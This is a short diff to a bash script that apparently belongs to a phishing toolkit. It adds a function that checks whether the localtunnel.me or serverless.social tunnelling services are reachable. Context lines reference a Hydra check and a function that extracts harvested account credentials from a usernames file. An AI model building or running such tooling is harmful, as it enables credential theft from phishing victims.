@@ -158,6 +158,16 @@ chk-hydra() {
 }
 export -f chk-hydra
 
+chk-tunnel() {
+	if ping -q -c 1 -W 1 serverless.social >/dev/null 2>&1;then
+		TUNNEL="serverless.social"
+	elif ping -q -c 1 -W 1 localtunnel.me >/dev/null 2>&1;then
+		TUNNEL="localtunnel.me"
+	else
+		printf "$R\n[W]->$W Server not available$R |$W try it later\n"
+		exit
+	fi
+}
 phishing-CredsResults() {
 	ACCOUNT=$(grep -o 'Account:.*' $TMP_PATH/usernames.txt | cut -d " " -f2)
 	if [ ! -z $ACCOUNT ]; then
